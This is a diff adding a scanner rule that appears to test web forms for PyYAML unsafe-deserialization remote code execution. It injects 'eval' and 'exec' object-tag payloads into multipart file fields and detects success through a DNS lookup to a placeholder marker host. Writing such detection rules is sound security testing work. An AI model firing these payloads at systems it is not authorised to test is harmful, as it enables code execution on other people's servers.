@@ -1,0 +1,22 @@
+generate:
+  - into: "POST_MULTIPART_.*_FILE_value"
+  - payload:
+    - "!!python/object/new:eval [CALC_MARKER]"
+    - "!!python/object/new:exec [import socket; socket.gethostbyname('DNS_MARKER')]"
+  - method:
+    - replace
+
+detect:
+  - oob:
+    - dns
+  - response:
+    - body: CALC_MARKER
+
+meta-info:
+  - type: rce
+  - threat: 90
+  - tags:
+    - pyYAML
+    - python-deserialization
+    - CVE-2017-18342
+    - CVE-2019-20477
